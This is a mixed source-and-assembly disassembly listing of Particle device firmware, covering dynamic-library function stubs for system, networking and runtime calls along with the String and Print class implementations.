DYNALIB_FN(0, system, system_mode, System_Mode_TypeDef(void))
DYNALIB_FN(1, system, set_system_mode, void(System_Mode_TypeDef))
 80a0314:	b508      	push	{r3, lr}
 80a0316:	4b02      	ldr	r3, [pc, #8]	; (80a0320 <set_system_mode+0xc>)
 80a0318:	681b      	ldr	r3, [r3, #0]
 80a031a:	685b      	ldr	r3, [r3, #4]
 80a031c:	9301      	str	r3, [sp, #4]
 80a031e:	bd08      	pop	{r3, pc}
 80a0320:	080601a4 	.word	0x080601a4

080a0324 <system_delay_ms>:

DYNALIB_FN(2, system, set_ymodem_serial_flash_update_handler, void(ymodem_serial_flash_update_handler))
DYNALIB_FN(3, system, system_firmwareUpdate, bool(Stream*, void*))
DYNALIB_FN(4, system, system_fileTransfer, bool(system_file_transfer_t*, void*))

DYNALIB_FN(5, system, system_delay_ms, void(unsigned long, bool))
 80a0324:	b508      	push	{r3, lr}
 80a0326:	4b02      	ldr	r3, [pc, #8]	; (80a0330 <system_delay_ms+0xc>)
 80a0328:	681b      	ldr	r3, [r3, #0]
 80a032a:	695b      	ldr	r3, [r3, #20]
 80a032c:	9301      	str	r3, [sp, #4]
 80a032e:	bd08      	pop	{r3, pc}
 80a0330:	080601a4 	.word	0x080601a4

080a0334 <system_ctrl_set_app_request_handler>:
DYNALIB_FN(BASE_IDX + 6, system, led_pattern_period, uint16_t(int, int, void*))
DYNALIB_FN(BASE_IDX + 7, system, system_set_tester_handlers, int(system_tester_handlers_t*, void*))
DYNALIB_FN(BASE_IDX + 8, system, system_format_diag_data, int(const uint16_t*, size_t, unsigned, appender_fn, void*, void*))

// Control requests
DYNALIB_FN(BASE_IDX + 9, system, system_ctrl_set_app_request_handler, int(ctrl_request_handler_fn, void*))
 80a0334:	b508      	push	{r3, lr}
 80a0336:	4b03      	ldr	r3, [pc, #12]	; (80a0344 <system_ctrl_set_app_request_handler+0x10>)
 80a0338:	681b      	ldr	r3, [r3, #0]
 80a033a:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 80a033e:	9301      	str	r3, [sp, #4]
 80a0340:	bd08      	pop	{r3, pc}
 80a0342:	0000      	.short	0x0000
 80a0344:	080601a4 	.word	0x080601a4

080a0348 <system_ctrl_set_result>:
DYNALIB_FN(BASE_IDX + 10, system, system_ctrl_alloc_reply_data, int(ctrl_request*, size_t, void*))
DYNALIB_FN(BASE_IDX + 11, system, system_ctrl_free_request_data, void(ctrl_request*, void*))
DYNALIB_FN(BASE_IDX + 12, system, system_ctrl_set_result, void(ctrl_request*, int, ctrl_completion_handler_fn, void*, void*))
 80a0348:	b508      	push	{r3, lr}
 80a034a:	4b03      	ldr	r3, [pc, #12]	; (80a0358 <system_ctrl_set_result+0x10>)
 80a034c:	681b      	ldr	r3, [r3, #0]
 80a034e:	f8d3 309c 	ldr.w	r3, [r3, #156]	; 0x9c
 80a0352:	9301      	str	r3, [sp, #4]
 80a0354:	bd08      	pop	{r3, pc}
 80a0356:	0000      	.short	0x0000
 80a0358:	080601a4 	.word	0x080601a4

080a035c <network_connect>:
#endif

DYNALIB_BEGIN(system_net)

DYNALIB_FN(0, system_net, network_config, const void*(network_handle_t, uint32_t, void*))
DYNALIB_FN(1, system_net, network_connect, void(network_handle_t, uint32_t, uint32_t, void*))
 80a035c:	b508      	push	{r3, lr}
 80a035e:	4b02      	ldr	r3, [pc, #8]	; (80a0368 <network_connect+0xc>)
 80a0360:	681b      	ldr	r3, [r3, #0]
 80a0362:	685b      	ldr	r3, [r3, #4]
 80a0364:	9301      	str	r3, [sp, #4]
 80a0366:	bd08      	pop	{r3, pc}
 80a0368:	080601c8 	.word	0x080601c8

080a036c <network_connecting>:
DYNALIB_FN(2, system_net, network_connecting, bool(network_handle_t, uint32_t, void*))
 80a036c:	b508      	push	{r3, lr}
 80a036e:	4b02      	ldr	r3, [pc, #8]	; (80a0378 <network_connecting+0xc>)
 80a0370:	681b      	ldr	r3, [r3, #0]
 80a0372:	689b      	ldr	r3, [r3, #8]
 80a0374:	9301      	str	r3, [sp, #4]
 80a0376:	bd08      	pop	{r3, pc}
 80a0378:	080601c8 	.word	0x080601c8

080a037c <network_disconnect>:
DYNALIB_FN(3, system_net, network_disconnect, void(network_handle_t, uint32_t, void*))
 80a037c:	b508      	push	{r3, lr}
 80a037e:	4b02      	ldr	r3, [pc, #8]	; (80a0388 <network_disconnect+0xc>)
 80a0380:	681b      	ldr	r3, [r3, #0]
 80a0382:	68db      	ldr	r3, [r3, #12]
 80a0384:	9301      	str	r3, [sp, #4]
 80a0386:	bd08      	pop	{r3, pc}
 80a0388:	080601c8 	.word	0x080601c8

080a038c <network_ready>:
DYNALIB_FN(4, system_net, network_ready, bool(network_handle_t, uint32_t, void*))
 80a038c:	b508      	push	{r3, lr}
 80a038e:	4b02      	ldr	r3, [pc, #8]	; (80a0398 <network_ready+0xc>)
 80a0390:	681b      	ldr	r3, [r3, #0]
 80a0392:	691b      	ldr	r3, [r3, #16]
 80a0394:	9301      	str	r3, [sp, #4]
 80a0396:	bd08      	pop	{r3, pc}
 80a0398:	080601c8 	.word	0x080601c8

080a039c <network_on>:
DYNALIB_FN(5, system_net, network_on, void(network_handle_t, uint32_t, uint32_t, void*))
 80a039c:	b508      	push	{r3, lr}
 80a039e:	4b02      	ldr	r3, [pc, #8]	; (80a03a8 <network_on+0xc>)
 80a03a0:	681b      	ldr	r3, [r3, #0]
 80a03a2:	695b      	ldr	r3, [r3, #20]
 80a03a4:	9301      	str	r3, [sp, #4]
 80a03a6:	bd08      	pop	{r3, pc}
 80a03a8:	080601c8 	.word	0x080601c8

080a03ac <network_off>:
DYNALIB_FN(6, system_net, network_off, void(network_handle_t, uint32_t, uint32_t, void*))
 80a03ac:	b508      	push	{r3, lr}
 80a03ae:	4b02      	ldr	r3, [pc, #8]	; (80a03b8 <network_off+0xc>)
 80a03b0:	681b      	ldr	r3, [r3, #0]
 80a03b2:	699b      	ldr	r3, [r3, #24]
 80a03b4:	9301      	str	r3, [sp, #4]
 80a03b6:	bd08      	pop	{r3, pc}
 80a03b8:	080601c8 	.word	0x080601c8

080a03bc <network_listen>:
DYNALIB_FN(7, system_net, network_listen, void(network_handle_t, uint32_t, void*))
 80a03bc:	b508      	push	{r3, lr}
 80a03be:	4b02      	ldr	r3, [pc, #8]	; (80a03c8 <network_listen+0xc>)
 80a03c0:	681b      	ldr	r3, [r3, #0]
 80a03c2:	69db      	ldr	r3, [r3, #28]
 80a03c4:	9301      	str	r3, [sp, #4]
 80a03c6:	bd08      	pop	{r3, pc}
 80a03c8:	080601c8 	.word	0x080601c8

080a03cc <network_listening>:
DYNALIB_FN(8, system_net, network_listening, bool(network_handle_t, uint32_t, void*))
 80a03cc:	b508      	push	{r3, lr}
 80a03ce:	4b02      	ldr	r3, [pc, #8]	; (80a03d8 <network_listening+0xc>)
 80a03d0:	681b      	ldr	r3, [r3, #0]
 80a03d2:	6a1b      	ldr	r3, [r3, #32]
 80a03d4:	9301      	str	r3, [sp, #4]
 80a03d6:	bd08      	pop	{r3, pc}
 80a03d8:	080601c8 	.word	0x080601c8

080a03dc <network_set_listen_timeout>:
DYNALIB_FN(9, system_net, network_has_credentials, bool(network_handle_t, uint32_t, void*))
DYNALIB_FN(10, system_net, network_set_credentials, int(network_handle_t, uint32_t, NetworkCredentials*, void*))
DYNALIB_FN(11, system_net, network_clear_credentials, bool(network_handle_t, uint32_t, NetworkCredentials*, void*))
DYNALIB_FN(12, system_net, network_set_listen_timeout, void(network_handle_t, uint16_t, void*))
 80a03dc:	b508      	push	{r3, lr}
 80a03de:	4b02      	ldr	r3, [pc, #8]	; (80a03e8 <network_set_listen_timeout+0xc>)
 80a03e0:	681b      	ldr	r3, [r3, #0]
 80a03e2:	6b1b      	ldr	r3, [r3, #48]	; 0x30
 80a03e4:	9301      	str	r3, [sp, #4]
 80a03e6:	bd08      	pop	{r3, pc}
 80a03e8:	080601c8 	.word	0x080601c8

080a03ec <network_get_listen_timeout>:
DYNALIB_FN(13, system_net, network_get_listen_timeout, uint16_t(network_handle_t, uint32_t, void*))
 80a03ec:	b508      	push	{r3, lr}
 80a03ee:	4b02      	ldr	r3, [pc, #8]	; (80a03f8 <network_get_listen_timeout+0xc>)
 80a03f0:	681b      	ldr	r3, [r3, #0]
 80a03f2:	6b5b      	ldr	r3, [r3, #52]	; 0x34
 80a03f4:	9301      	str	r3, [sp, #4]
 80a03f6:	bd08      	pop	{r3, pc}
 80a03f8:	080601c8 	.word	0x080601c8

080a03fc <network_is_on>:
DYNALIB_FN(14, system_net, network_set_hostname, int(network_handle_t, uint32_t, const char*, void*))
DYNALIB_FN(15, system_net, network_get_hostname, int(network_handle_t, uint32_t, char*, size_t, void*))
DYNALIB_FN(16, system_net, network_is_on, bool(network_handle_t, void*))
 80a03fc:	b508      	push	{r3, lr}
 80a03fe:	4b02      	ldr	r3, [pc, #8]	; (80a0408 <network_is_on+0xc>)
 80a0400:	681b      	ldr	r3, [r3, #0]
 80a0402:	6c1b      	ldr	r3, [r3, #64]	; 0x40
 80a0404:	9301      	str	r3, [sp, #4]
 80a0406:	bd08      	pop	{r3, pc}
 80a0408:	080601c8 	.word	0x080601c8

080a040c <network_is_off>:
DYNALIB_FN(17, system_net, network_is_off, bool(network_handle_t, void*))
 80a040c:	b508      	push	{r3, lr}
 80a040e:	4b02      	ldr	r3, [pc, #8]	; (80a0418 <network_is_off+0xc>)
 80a0410:	681b      	ldr	r3, [r3, #0]
 80a0412:	6c5b      	ldr	r3, [r3, #68]	; 0x44
 80a0414:	9301      	str	r3, [sp, #4]
 80a0416:	bd08      	pop	{r3, pc}
 80a0418:	080601c8 	.word	0x080601c8

080a041c <spark_set_random_seed_from_cloud_handler>:
DYNALIB_FN(10, system_cloud, spark_unsubscribe, void(void*))
DYNALIB_FN(11, system_cloud, spark_sync_time, bool(void*))
DYNALIB_FN(12, system_cloud, spark_sync_time_pending, bool(void*))
DYNALIB_FN(13, system_cloud, spark_sync_time_last, system_tick_t(time32_t*, time_t*))
DYNALIB_FN(14, system_cloud, spark_set_connection_property, int(unsigned, unsigned, const void*, void*))
DYNALIB_FN(15, system_cloud, spark_set_random_seed_from_cloud_handler, int(void (*handler)(unsigned int), void*))
 80a041c:	b508      	push	{r3, lr}
 80a041e:	4b02      	ldr	r3, [pc, #8]	; (80a0428 <spark_set_random_seed_from_cloud_handler+0xc>)
 80a0420:	681b      	ldr	r3, [r3, #0]
 80a0422:	6bdb      	ldr	r3, [r3, #60]	; 0x3c
 80a0424:	9301      	str	r3, [sp, #4]
 80a0426:	bd08      	pop	{r3, pc}
 80a0428:	080601cc 	.word	0x080601cc

080a042c <malloc>:
#include "hal_platform.h"
#endif // defined(DYNALIB_EXPORT) || (defined(DYNALIB_IMPORT) && !defined(RT_DYNALIB_NO_DEPENDENCY_BREAKING_IMPORTS))

DYNALIB_BEGIN(rt)

DYNALIB_FN(0, rt, malloc, void*(size_t))
 80a042c:	b508      	push	{r3, lr}
 80a042e:	4b02      	ldr	r3, [pc, #8]	; (80a0438 <malloc+0xc>)
 80a0430:	681b      	ldr	r3, [r3, #0]
 80a0432:	681b      	ldr	r3, [r3, #0]
 80a0434:	9301      	str	r3, [sp, #4]
 80a0436:	bd08      	pop	{r3, pc}
 80a0438:	080601a0 	.word	0x080601a0

080a043c <free>:
DYNALIB_FN(1, rt, free, void(void*))
 80a043c:	b508      	push	{r3, lr}
 80a043e:	4b02      	ldr	r3, [pc, #8]	; (80a0448 <free+0xc>)
 80a0440:	681b      	ldr	r3, [r3, #0]
 80a0442:	685b      	ldr	r3, [r3, #4]
 80a0444:	9301      	str	r3, [sp, #4]
 80a0446:	bd08      	pop	{r3, pc}
 80a0448:	080601a0 	.word	0x080601a0

080a044c <realloc>:
DYNALIB_FN(2, rt, realloc, void*(void*, size_t))
 80a044c:	b508      	push	{r3, lr}
 80a044e:	4b02      	ldr	r3, [pc, #8]	; (80a0458 <realloc+0xc>)
 80a0450:	681b      	ldr	r3, [r3, #0]
 80a0452:	689b      	ldr	r3, [r3, #8]
 80a0454:	9301      	str	r3, [sp, #4]
 80a0456:	bd08      	pop	{r3, pc}
 80a0458:	080601a0 	.word	0x080601a0

080a045c <__assert_func>:
// on Gen 2 platforms without breaking inter-module dependencies.
// RT is currently being imported into system-part1 from system-part2,
// which is the reverse direction.

#if defined(DYNALIB_EXPORT) || (defined(DYNALIB_IMPORT) && !defined(RT_DYNALIB_NO_DEPENDENCY_BREAKING_IMPORTS))
DYNALIB_FN(16, rt, __assert_func, void(const char*, int, const char*, const char*))
 80a045c:	b508      	push	{r3, lr}
 80a045e:	4b02      	ldr	r3, [pc, #8]	; (80a0468 <__assert_func+0xc>)
 80a0460:	681b      	ldr	r3, [r3, #0]
 80a0462:	6c1b      	ldr	r3, [r3, #64]	; 0x40
 80a0464:	9301      	str	r3, [sp, #4]
 80a0466:	bd08      	pop	{r3, pc}
 80a0468:	080601a0 	.word	0x080601a0

080a046c <newlib_impure_ptr_callback>:
DYNALIB_FN(17, rt, newlib_impure_ptr_callback, void(void (*)(struct _reent*, size_t, uint32_t, void*), void*))
 80a046c:	b508      	push	{r3, lr}
 80a046e:	4b02      	ldr	r3, [pc, #8]	; (80a0478 <newlib_impure_ptr_callback+0xc>)
 80a0470:	681b      	ldr	r3, [r3, #0]
 80a0472:	6c5b      	ldr	r3, [r3, #68]	; 0x44
 80a0474:	9301      	str	r3, [sp, #4]
 80a0476:	bd08      	pop	{r3, pc}
 80a0478:	080601a0 	.word	0x080601a0

080a047c <_GLOBAL__sub_I_System>:
} // namespace particle

// particle::Flag<TagT, ValueT>
template<typename TagT, typename ValueT>
inline particle::Flag<TagT, ValueT>::Flag(ValueT val) :
        val_(val) {
 80a047c:	2202      	movs	r2, #2

class SystemSleepResult {
public:
    SystemSleepResult()
            : wakeupSource_(nullptr),
              error_(SYSTEM_ERROR_NONE) {
 80a047e:	2000      	movs	r0, #0
 80a0480:	4b04      	ldr	r3, [pc, #16]	; (80a0494 <_GLOBAL__sub_I_System+0x18>)
 80a0482:	601a      	str	r2, [r3, #0]
 80a0484:	4b04      	ldr	r3, [pc, #16]	; (80a0498 <_GLOBAL__sub_I_System+0x1c>)
    SleepResult() {}
 80a0486:	4a05      	ldr	r2, [pc, #20]	; (80a049c <_GLOBAL__sub_I_System+0x20>)
              error_(SYSTEM_ERROR_NONE) {
 80a0488:	e9c3 0000 	strd	r0, r0, [r3]
    SleepResult() {}
 80a048c:	609a      	str	r2, [r3, #8]

class SystemClass {
public:

    SystemClass(System_Mode_TypeDef mode = DEFAULT) {
        set_system_mode(mode);
 80a048e:	f7ff bf41 	b.w	80a0314 <set_system_mode>
 80a0492:	bf00      	nop
 80a0494:	20000078 	.word	0x20000078
 80a0498:	2000006c 	.word	0x2000006c
 80a049c:	ffff0000 	.word	0xffff0000

080a04a0 <_ZN6StringD1Ev>:
	init();
	char buf[33];
	dtoa(value, decimalPlaces, buf);
        *this = buf;
}
String::~String()
 80a04a0:	b510      	push	{r4, lr}
 80a04a2:	4604      	mov	r4, r0
{
	free(buffer);
 80a04a4:	6800      	ldr	r0, [r0, #0]
 80a04a6:	f7ff ffc9 	bl	80a043c <free>
}
 80a04aa:	4620      	mov	r0, r4
 80a04ac:	bd10      	pop	{r4, pc}

080a04ae <_ZN6String10invalidateEv>:
	len = 0;
	flags = 0;
}

void String::invalidate(void)
{
 80a04ae:	b510      	push	{r4, lr}
 80a04b0:	4604      	mov	r4, r0
	if (buffer) free(buffer);
 80a04b2:	6800      	ldr	r0, [r0, #0]
 80a04b4:	b108      	cbz	r0, 80a04ba <_ZN6String10invalidateEv+0xc>
 80a04b6:	f7ff ffc1 	bl	80a043c <free>
	buffer = NULL;
 80a04ba:	2300      	movs	r3, #0
	capacity = len = 0;
 80a04bc:	e9c4 3301 	strd	r3, r3, [r4, #4]
	buffer = NULL;
 80a04c0:	6023      	str	r3, [r4, #0]
}
 80a04c2:	bd10      	pop	{r4, pc}

080a04c4 <_ZN6String12changeBufferEj>:
	}
	return 0;
}

unsigned char String::changeBuffer(unsigned int maxStrLen)
{
 80a04c4:	b538      	push	{r3, r4, r5, lr}
 80a04c6:	4604      	mov	r4, r0
 80a04c8:	460d      	mov	r5, r1
	char *newbuffer = (char *)realloc(buffer, maxStrLen + 1);
 80a04ca:	6800      	ldr	r0, [r0, #0]
 80a04cc:	3101      	adds	r1, #1
 80a04ce:	f7ff ffbd 	bl	80a044c <realloc>
	if (newbuffer) {
 80a04d2:	b110      	cbz	r0, 80a04da <_ZN6String12changeBufferEj+0x16>
		buffer = newbuffer;
		capacity = maxStrLen;
 80a04d4:	e9c4 0500 	strd	r0, r5, [r4]
		return 1;
 80a04d8:	2001      	movs	r0, #1
	}
	return 0;
}
 80a04da:	bd38      	pop	{r3, r4, r5, pc}

080a04dc <_ZN6String7reserveEj>:
{
 80a04dc:	b510      	push	{r4, lr}
	if (buffer && capacity >= size) return 1;
 80a04de:	6803      	ldr	r3, [r0, #0]
{
 80a04e0:	4604      	mov	r4, r0
	if (buffer && capacity >= size) return 1;
 80a04e2:	b123      	cbz	r3, 80a04ee <_ZN6String7reserveEj+0x12>
 80a04e4:	6843      	ldr	r3, [r0, #4]
 80a04e6:	428b      	cmp	r3, r1
 80a04e8:	d301      	bcc.n	80a04ee <_ZN6String7reserveEj+0x12>
 80a04ea:	2001      	movs	r0, #1
}
 80a04ec:	bd10      	pop	{r4, pc}
	if (changeBuffer(size)) {
 80a04ee:	4620      	mov	r0, r4
 80a04f0:	f7ff ffe8 	bl	80a04c4 <_ZN6String12changeBufferEj>
 80a04f4:	2800      	cmp	r0, #0
 80a04f6:	d0f9      	beq.n	80a04ec <_ZN6String7reserveEj+0x10>
		if (len == 0) buffer[0] = 0;
 80a04f8:	68a3      	ldr	r3, [r4, #8]
 80a04fa:	2b00      	cmp	r3, #0
 80a04fc:	d1f5      	bne.n	80a04ea <_ZN6String7reserveEj+0xe>
 80a04fe:	6822      	ldr	r2, [r4, #0]
 80a0500:	7013      	strb	r3, [r2, #0]
 80a0502:	e7f2      	b.n	80a04ea <_ZN6String7reserveEj+0xe>

080a0504 <_ZN6String4copyEPKcj>:
/*********************************************/
/*  Copy and Move                            */
/*********************************************/

String & String::copy(const char *cstr, unsigned int length)
{
 80a0504:	b570      	push	{r4, r5, r6, lr}
 80a0506:	460e      	mov	r6, r1
	if (!reserve(length)) {
 80a0508:	4611      	mov	r1, r2
{
 80a050a:	4604      	mov	r4, r0
 80a050c:	4615      	mov	r5, r2
	if (!reserve(length)) {
 80a050e:	f7ff ffe5 	bl	80a04dc <_ZN6String7reserveEj>
 80a0512:	b920      	cbnz	r0, 80a051e <_ZN6String4copyEPKcj+0x1a>
		invalidate();
 80a0514:	4620      	mov	r0, r4
 80a0516:	f7ff ffca 	bl	80a04ae <_ZN6String10invalidateEv>
	}
	len = length;
	memcpy(buffer, cstr, length);
	buffer[len] = 0;
	return *this;
}
 80a051a:	4620      	mov	r0, r4
 80a051c:	bd70      	pop	{r4, r5, r6, pc}
	memcpy(buffer, cstr, length);
 80a051e:	462a      	mov	r2, r5
 80a0520:	4631      	mov	r1, r6
 80a0522:	6820      	ldr	r0, [r4, #0]
	len = length;
 80a0524:	60a5      	str	r5, [r4, #8]
	memcpy(buffer, cstr, length);
 80a0526:	f000 fd11 	bl	80a0f4c <memcpy>
	buffer[len] = 0;
 80a052a:	2100      	movs	r1, #0
 80a052c:	6822      	ldr	r2, [r4, #0]
 80a052e:	68a3      	ldr	r3, [r4, #8]
 80a0530:	54d1      	strb	r1, [r2, r3]
	return *this;
 80a0532:	e7f2      	b.n	80a051a <_ZN6String4copyEPKcj+0x16>

080a0534 <_ZN6StringC1EPK19__FlashStringHelper>:
String::String(const __FlashStringHelper *pstr)
 80a0534:	b538      	push	{r3, r4, r5, lr}
	buffer = NULL;
 80a0536:	2300      	movs	r3, #0
String::String(const __FlashStringHelper *pstr)
 80a0538:	4604      	mov	r4, r0
	if (cstr) copy(cstr, strlen(cstr));
 80a053a:	460d      	mov	r5, r1
	capacity = 0;
 80a053c:	e9c0 3300 	strd	r3, r3, [r0]
	len = 0;
 80a0540:	6083      	str	r3, [r0, #8]
	flags = 0;
 80a0542:	7303      	strb	r3, [r0, #12]
	if (cstr) copy(cstr, strlen(cstr));
 80a0544:	b139      	cbz	r1, 80a0556 <_ZN6StringC1EPK19__FlashStringHelper+0x22>
	if (cstr) copy(cstr, strlen(cstr));
 80a0546:	4608      	mov	r0, r1
 80a0548:	f000 fd4c 	bl	80a0fe4 <strlen>
 80a054c:	4629      	mov	r1, r5
 80a054e:	4602      	mov	r2, r0
 80a0550:	4620      	mov	r0, r4
 80a0552:	f7ff ffd7 	bl	80a0504 <_ZN6String4copyEPKcj>
}
 80a0556:	4620      	mov	r0, r4
 80a0558:	bd38      	pop	{r3, r4, r5, pc}

080a055a <_ZN6String6concatEPKcj>:
{
	return concat(s.buffer, s.len);
}

unsigned char String::concat(const char *cstr, unsigned int length)
{
 80a055a:	b570      	push	{r4, r5, r6, lr}
 80a055c:	4605      	mov	r5, r0
	unsigned int newlen = len + length;
	if (!cstr) return 0;
 80a055e:	460e      	mov	r6, r1
 80a0560:	b909      	cbnz	r1, 80a0566 <_ZN6String6concatEPKcj+0xc>
 80a0562:	2000      	movs	r0, #0
	if (length == 0) return 1;
	if (!reserve(newlen)) return 0;
	strcpy(buffer + len, cstr);
	len = newlen;
	return 1;
}
 80a0564:	bd70      	pop	{r4, r5, r6, pc}
	if (length == 0) return 1;
 80a0566:	b16a      	cbz	r2, 80a0584 <_ZN6String6concatEPKcj+0x2a>
	unsigned int newlen = len + length;
 80a0568:	6884      	ldr	r4, [r0, #8]
 80a056a:	4414      	add	r4, r2
	if (!reserve(newlen)) return 0;
 80a056c:	4621      	mov	r1, r4
 80a056e:	f7ff ffb5 	bl	80a04dc <_ZN6String7reserveEj>
 80a0572:	2800      	cmp	r0, #0
 80a0574:	d0f5      	beq.n	80a0562 <_ZN6String6concatEPKcj+0x8>
	strcpy(buffer + len, cstr);
 80a0576:	6828      	ldr	r0, [r5, #0]
 80a0578:	68ab      	ldr	r3, [r5, #8]
 80a057a:	4631      	mov	r1, r6
 80a057c:	4418      	add	r0, r3
 80a057e:	f000 fd29 	bl	80a0fd4 <strcpy>
	len = newlen;
 80a0582:	60ac      	str	r4, [r5, #8]
	if (length == 0) return 1;
 80a0584:	2001      	movs	r0, #1
 80a0586:	e7ed      	b.n	80a0564 <_ZN6String6concatEPKcj+0xa>

080a0588 <_ZplRK15StringSumHelperRK6String>:
/*********************************************/
/*  Concatenate                              */
/*********************************************/

StringSumHelper & operator + (const StringSumHelper &lhs, const String &rhs)
{
 80a0588:	b510      	push	{r4, lr}
	StringSumHelper &a = const_cast<StringSumHelper&>(lhs);
	if (!a.concat(rhs.buffer, rhs.len)) a.invalidate();
 80a058a:	688a      	ldr	r2, [r1, #8]
 80a058c:	6809      	ldr	r1, [r1, #0]
{
 80a058e:	4604      	mov	r4, r0
	if (!a.concat(rhs.buffer, rhs.len)) a.invalidate();
 80a0590:	f7ff ffe3 	bl	80a055a <_ZN6String6concatEPKcj>
 80a0594:	b910      	cbnz	r0, 80a059c <_ZplRK15StringSumHelperRK6String+0x14>
 80a0596:	4620      	mov	r0, r4
 80a0598:	f7ff ff89 	bl	80a04ae <_ZN6String10invalidateEv>
	return a;
}
 80a059c:	4620      	mov	r0, r4
 80a059e:	bd10      	pop	{r4, pc}

080a05a0 <_ZplRK15StringSumHelperPKc>:

StringSumHelper & operator + (const StringSumHelper &lhs, const char *cstr)
{
 80a05a0:	b538      	push	{r3, r4, r5, lr}
 80a05a2:	4604      	mov	r4, r0
	StringSumHelper &a = const_cast<StringSumHelper&>(lhs);
	if (!cstr || !a.concat(cstr, strlen(cstr))) a.invalidate();
 80a05a4:	460d      	mov	r5, r1
 80a05a6:	b921      	cbnz	r1, 80a05b2 <_ZplRK15StringSumHelperPKc+0x12>
 80a05a8:	4620      	mov	r0, r4
 80a05aa:	f7ff ff80 	bl	80a04ae <_ZN6String10invalidateEv>
	return a;
}
 80a05ae:	4620      	mov	r0, r4
 80a05b0:	bd38      	pop	{r3, r4, r5, pc}
	if (!cstr || !a.concat(cstr, strlen(cstr))) a.invalidate();
 80a05b2:	4608      	mov	r0, r1
 80a05b4:	f000 fd16 	bl	80a0fe4 <strlen>
 80a05b8:	4629      	mov	r1, r5
 80a05ba:	4602      	mov	r2, r0
 80a05bc:	4620      	mov	r0, r4
 80a05be:	f7ff ffcc 	bl	80a055a <_ZN6String6concatEPKcj>
 80a05c2:	2800      	cmp	r0, #0
 80a05c4:	d0f0      	beq.n	80a05a8 <_ZplRK15StringSumHelperPKc+0x8>
 80a05c6:	e7f2      	b.n	80a05ae <_ZplRK15StringSumHelperPKc+0xe>

080a05c8 <_ZN5Print5writeEPKhj>:

// Public Methods //////////////////////////////////////////////////////////////

/* default implementation: may be overridden */
size_t Print::write(const uint8_t *buffer, size_t size)
{
 80a05c8:	b5f8      	push	{r3, r4, r5, r6, r7, lr}
 80a05ca:	4606      	mov	r6, r0
 80a05cc:	460d      	mov	r5, r1
  size_t n = 0;
 80a05ce:	2400      	movs	r4, #0
 80a05d0:	188f      	adds	r7, r1, r2
  while (size--) {
 80a05d2:	42bd      	cmp	r5, r7
 80a05d4:	d00c      	beq.n	80a05f0 <_ZN5Print5writeEPKhj+0x28>
     int chunk = write(*buffer++);
 80a05d6:	6833      	ldr	r3, [r6, #0]
 80a05d8:	4630      	mov	r0, r6
 80a05da:	689b      	ldr	r3, [r3, #8]
 80a05dc:	f815 1b01 	ldrb.w	r1, [r5], #1
 80a05e0:	4798      	blx	r3
     if (chunk>=0)
 80a05e2:	1e03      	subs	r3, r0, #0
 80a05e4:	db01      	blt.n	80a05ea <_ZN5Print5writeEPKhj+0x22>
         n += chunk;
 80a05e6:	441c      	add	r4, r3
  while (size--) {
 80a05e8:	e7f3      	b.n	80a05d2 <_ZN5Print5writeEPKhj+0xa>
     int chunk = write(*buffer++);
 80a05ea:	2c00      	cmp	r4, #0
 80a05ec:	bf08      	it	eq
 80a05ee:	461c      	moveq	r4, r3
             n = chunk;
         break;
     }
  }
  return n;
}
 80a05f0:	4620      	mov	r0, r4
 80a05f2:	bdf8      	pop	{r3, r4, r5, r6, r7, pc}

080a05f4 <_ZN5Print5writeEPKc>:

    int getWriteError() { return write_error; }
    void clearWriteError() { setWriteError(0); }

    virtual size_t write(uint8_t) = 0;
    size_t write(const char *str) {
 80a05f4:	b570      	push	{r4, r5, r6, lr}
 80a05f6:	4605      	mov	r5, r0
      if (str == NULL) return 0;
 80a05f8:	460c      	mov	r4, r1
      return write((const uint8_t *)str, strlen(str));
    }
 80a05fa:	4608      	mov	r0, r1
      if (str == NULL) return 0;
 80a05fc:	b149      	cbz	r1, 80a0612 <_ZN5Print5writeEPKc+0x1e>
      return write((const uint8_t *)str, strlen(str));
 80a05fe:	f000 fcf1 	bl	80a0fe4 <strlen>
 80a0602:	682b      	ldr	r3, [r5, #0]
 80a0604:	4602      	mov	r2, r0
 80a0606:	4621      	mov	r1, r4
 80a0608:	4628      	mov	r0, r5
    }
 80a060a:	e8bd 4070 	ldmia.w	sp!, {r4, r5, r6, lr}
      return write((const uint8_t *)str, strlen(str));
 80a060e:	68db      	ldr	r3, [r3, #12]
 80a0610:	4718      	bx	r3
    }
 80a0612:	bd70      	pop	{r4, r5, r6, pc}

080a0614 <_ZN5Print5printEPKc>:

size_t Print::print(const char str[])
{
 80a0614:	b508      	push	{r3, lr}
  return write(str);
 80a0616:	f7ff ffed 	bl	80a05f4 <_ZN5Print5writeEPKc>
}
 80a061a:	bd08      	pop	{r3, pc}

080a061c <_ZN5Print5printEc>:

size_t Print::print(char c)
{
  return write(c);
 80a061c:	6803      	ldr	r3, [r0, #0]
 80a061e:	689b      	ldr	r3, [r3, #8]
 80a0620:	4718      	bx	r3

080a0622 <_ZN5Print11printNumberEmh>:

size_t Print::printNumber(unsigned long n, uint8_t base) {
  char buf[8 * sizeof(n) + 1]; // Assumes 8-bit chars plus zero byte.
  char *str = &buf[sizeof(buf) - 1];

  *str = '\0';
 80a0622:	2300      	movs	r3, #0

  // prevent crash if called with base == 1
  if (base < 2) base = 10;
 80a0624:	2a01      	cmp	r2, #1
 80a0626:	bf98      	it	ls
 80a0628:	220a      	movls	r2, #10
size_t Print::printNumber(unsigned long n, uint8_t base) {
 80a062a:	b530      	push	{r4, r5, lr}
 80a062c:	b08b      	sub	sp, #44	; 0x2c
 80a062e:	460c      	mov	r4, r1
  *str = '\0';
 80a0630:	f88d 3024 	strb.w	r3, [sp, #36]	; 0x24
  if (base < 2) base = 10;
 80a0634:	a909      	add	r1, sp, #36	; 0x24

  do {
   decltype(n) m = n;
   n /= base;
 80a0636:	4625      	mov	r5, r4
 80a0638:	fbb4 f4f2 	udiv	r4, r4, r2
   char c = m - base * n;
 80a063c:	fb04 5312 	mls	r3, r4, r2, r5
 80a0640:	b2db      	uxtb	r3, r3
   *--str = c < 10 ? c + '0' : c + 'A' - 10;
 80a0642:	2b09      	cmp	r3, #9
 80a0644:	bf94      	ite	ls
 80a0646:	3330      	addls	r3, #48	; 0x30
 80a0648:	3337      	addhi	r3, #55	; 0x37
 80a064a:	b2db      	uxtb	r3, r3
  } while(n);
 80a064c:	42aa      	cmp	r2, r5
   *--str = c < 10 ? c + '0' : c + 'A' - 10;
 80a064e:	f801 3d01 	strb.w	r3, [r1, #-1]!
  } while(n);
 80a0652:	d9f0      	bls.n	80a0636 <_ZN5Print11printNumberEmh+0x14>

  return write(str);
 80a0654:	f7ff ffce 	bl	80a05f4 <_ZN5Print5writeEPKc>
}
